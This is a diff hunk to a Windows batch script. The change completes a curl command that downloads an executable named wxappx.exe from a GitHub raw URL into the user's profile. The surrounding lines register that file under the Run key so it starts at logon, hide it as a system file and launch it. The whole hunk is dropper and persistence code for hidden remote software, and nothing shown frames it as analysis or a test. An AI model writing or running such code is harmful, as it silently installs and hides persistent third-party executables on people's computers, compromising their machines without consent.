@@ -13,7 +13,7 @@ IF EXIST "C:\Users\%USERNAME%\configuration\" (
 IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.exe" (
 	goto rewind_1
 ) ELSE (
-	curl
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.exe" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/wxappx.exe"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WXAppX /t REG_SZ /d "C:\Users\%USERNAME%\configuration\wxappx.exe" /f
 	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.exe"
 	start "" "C:\Users\%USERNAME%\configuration\wxappx.exe"
